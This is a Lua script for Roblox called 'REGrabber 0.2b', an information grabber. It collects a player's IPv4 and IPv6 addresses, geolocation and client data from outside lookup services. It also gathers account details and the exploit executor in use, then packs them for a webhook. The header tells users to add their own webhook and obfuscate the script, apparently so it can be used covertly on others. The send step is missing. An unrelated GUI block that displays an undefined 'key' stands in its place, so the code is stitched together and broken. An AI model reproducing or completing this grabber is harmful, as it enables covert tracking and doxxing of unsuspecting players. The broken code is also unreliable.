--[[
    REGrabber 0.2b
    Roblox Exploit Grabber
    by bang1338
    
    Special thank to all V3million forum,
    Roblox Dev forum and stackoverflow.
    
    Starting by replacing your webhook
    and obfuscate it.
]]--


local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (you can replace this with any API service)
local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (you can replace this with any API service)
local HTTPbin = game:HttpGet("https://httpbin.org/get") -- Getting some client info
local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4) -- Getting location info
-- TODO: Using Shodan API

local Headers = {["content-type"] = "application/json"} -- DO NOT TOUCH

local LocalPlayer = game:GetService("Players").LocalPlayer -- LocalPlayer

local AccountAge = LocalPlayer.AccountAge -- Account age since created
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21) -- Membership type: None or Premium
local UserId = LocalPlayer.UserId -- UserID
local PlayerName = LocalPlayer.Name -- Player name
local DisplayName= LocalPlayer.DisplayName
local PlaceID = game.PlaceId -- The game that player is playing


local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') -- Get date of grabbed/logged
local rver = "Version 0.2b" -- Change to your version if you want

--[[ Identify the executor ]]--
-- https://v3rmillion.net/showthread.php?tid=1163680&page=2
function identifyexploit()
   local ieSuccess, ieResult = pcall(identifyexecutor)
   if ieSuccess then return ieResult end
   
   return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher")
end

--[[ Webhook ]]--
local PlayerData = {
        ["content"] = "",
        ["embeds"] = {{
           
            ["author"] = {
                ["name"] = "REGrabber "..rver, -- Grabber name and version
            },
           
            ["title"] = PlayerName, -- Username/PlayerName
            ["description"] = "aka "..DisplayName, -- Display Name/Nickname
            ["fields"] = {
                {
                    --[[Username/PlayerName]]--
                    ["name"] = "Username:",
                    ["value"] = PlayerName,
                    ["inline"] = true
                },
                {
                    --[[Membership type]]--
                    ["name"] = "Membership Type:",
                    ["value"] = MembershipType,
                    ["inline"] = true
                },
                {
                    --[[Account age]]--
                    ["name"] = "Account Age (days):",
                    ["value"] = AccountAge,
                    ["inline"] = true
                },
                {
                    --[[UserID]]--
                    ["name"] = "UserId:",
                    ["value"] = UserId,
                    ["inline"] = true
                },
                {
                    --[[IPv4]]--
                    ["name"] = "IPv4:",
                    ["value"] = IPv4,
                    ["inline"] = true
                },
                {
                    --[[IPv6]]--
                    ["name"] = "IPv6:",
                    ["value"] = IPv6,
                    ["inline"] = true
                },
                {
                    --[[PlaceID]]--
                    ["name"] = "Place ID: ",
                    ["value"] = PlaceID,
                    ["inline"] = true
                },
                {
                    --[[Exploit/Executor]]--
                    ["name"] = "Executor: ",
                    ["value"] = identifyexploit(),
                    ["inline"] = true
                },
                {
                    --[[Log/Grab time]]--
                    ["name"] = "Log Time:",
                    ["value"] = LogTime,
                    ["inline"] = true
                },
                {
                    --[[HTTPbin]]--
                    ["name"] = "HTTPbin Data (JSON):",
                    ["value"] = "```json"..'\n'..HTTPbin.."```",
                    ["inline"] = false
                },
                {
                    --[[geoPlugin]]--
                    ["name"] = "geoPlugin Data (JSON):",
                    ["value"] = "```json"..'\n'..GeoPlug.."```",
                    ["inline"] = false
                },
            },
        }}
    }


local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;

if syn then
    HttpRequest = syn.request
    else
    HttpRequest = http_request
end

-- Send to your webhook.
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create GUI container
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "InfoGui"
screenGui.Parent = playerGui

-- Create a frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 100)
frame.Position = UDim2.new(0.5, -150, 0.5, -50)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = screenGui

-- Display the info/key
local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(1, 0, 0.5, 0)
infoLabel.TextScaled = true
infoLabel.BackgroundTransparency = 1
infoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
infoLabel.Text = "Info: " .. key  -- <- original info
infoLabel.Parent = frame

-- Copy button
local copyButton = Instance.new("TextButton")
copyButton.Size = UDim2.new(1, 0, 0.5, 0)
copyButton.Position = UDim2.new(0, 0, 0.5, 0)
copyButton.Text = "Copy Info"
copyButton.TextScaled = true
copyButton.Parent = frame

-- Copy to clipboard
local ClipboardService = game:GetService("ClipboardService")
copyButton.MouseButton1Click:Connect(function()
    ClipboardService:SetClipboard(key)
end)
